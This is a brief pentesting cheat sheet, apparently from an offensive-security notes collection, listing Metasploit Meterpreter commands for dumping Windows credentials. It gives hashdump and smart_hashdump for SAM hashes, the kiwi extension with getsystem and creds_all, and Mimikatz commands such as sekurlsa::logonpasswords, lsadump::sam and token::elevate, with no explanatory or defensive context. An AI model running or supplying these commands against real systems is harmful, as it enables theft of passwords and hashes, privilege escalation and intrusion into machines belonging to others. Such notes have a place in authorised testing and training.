# Mimikatz Metasploit


```
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
getsystem
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"

#Using Mimikatz module
load kiwi
kiwi_cmd -f "sekurlsa::logonpasswords"
kiwi_cmd -f "lsadump::sam"



kiwi_cmd "sekurlsa::logonPasswords"

```



